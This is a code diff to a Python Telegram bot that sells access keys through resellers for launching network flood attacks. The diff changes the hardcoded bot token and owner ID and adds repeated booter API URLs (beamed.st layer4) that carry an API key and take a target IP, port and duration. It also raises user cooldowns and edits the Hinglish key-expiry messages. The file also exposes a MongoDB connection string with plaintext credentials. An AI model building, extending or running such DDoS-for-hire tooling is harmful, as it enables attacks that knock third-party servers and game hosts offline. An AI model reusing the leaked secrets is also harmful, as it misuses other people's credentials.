@@ -13,7 +13,7 @@ import psutil
 
 BOT_START_TIME = datetime.now()
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "6704057021:AAH16jkATbO4Ha-bk0-QIj9Oq6hw1Ir_8mk")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8510341937:AAHwV-i_LAbPztHhTOe_Js7OSGO5kLd_p2c")
 MONGO_URL = os.getenv("MONGO_URL", "mongodb+srv://random83:random83@cluster0.nat9vrz.mongodb.net/?appName=Cluster0")
 
 print("Connecting to MongoDB...")
@@ -38,7 +38,7 @@ except Exception as e:
     print(f"MongoDB connection error: {e}")
     exit(1)
 
-BOT_OWNER = 5759284972
+BOT_OWNER = 8523310365
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -52,12 +52,15 @@ RESELLER_PRICING = {
 }
 
 API_LIST = [
+    "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
+    "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
+    "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1",
     "https://beamed.st/layer4/?user=4988&key=CPC4F2CIbJFX6Hik&host={ip}&port={port}&time={time}&method=PUBG&concs=1"
     
 ]
 
 DEFAULT_MAX_ATTACK_TIME = 300
-DEFAULT_USER_COOLDOWN = 60
+DEFAULT_USER_COOLDOWN = 180
 
 def get_setting(key, default):
     try:
@@ -1413,7 +1416,7 @@ def my_key_command(message):
     if not has_valid_key(user_id):
         reseller_username = user.get('reseller_username')
         if reseller_username:
-            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye DM karo: @{reseller_username}", parse_mode="Markdown")
+            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye apne seller ko DM karo", parse_mode="Markdown")
         else:
             bot.reply_to(message, "❌ Key khatam ho gayi!")
         return
@@ -2072,7 +2075,7 @@ def handle_attack(message):
         user = users_collection.find_one({'user_id': user_id})
         if user and user.get('reseller_username'):
             reseller_name = user.get('reseller_username')
-            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye DM karo: @{reseller_name}")
+            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye apne seller ko DM karo")
         else:
             bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n\n🔑 Key kharidne ke liye reseller se contact karo.")
         return
